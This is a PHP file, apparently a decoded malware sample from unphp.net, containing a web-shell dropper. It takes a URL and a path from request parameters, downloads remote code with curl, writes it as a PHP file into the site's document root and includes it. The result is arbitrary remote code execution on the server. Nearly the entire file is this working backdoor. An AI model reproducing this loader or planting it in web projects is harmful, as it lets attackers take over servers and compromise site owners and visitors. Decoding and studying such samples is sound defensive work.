/* Decoded by unphp.net */

<?php /*5ccbd89a76d58*/ ?><?php
function file_func($path, $data) {
    file_put_contents($path, '<?php /*' . uniqid() . '*/ ?>' . $data);
}
if (file_exists($_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'])) {
    chmod($_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'] . '.php', 0644);
    include $_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'] . '.php';
} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $_GET['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $data = curl_exec($ch);
    if ($data) {
        $dsdzzsvxz = $data . '';
        file_func($_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'] . '.php', $dsdzzsvxz);
        chmod($_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'] . '.php', 0644);
        include $_SERVER["DOCUMENT_ROOT"] . '/' . $_GET['path'] . '.php';
    }
}
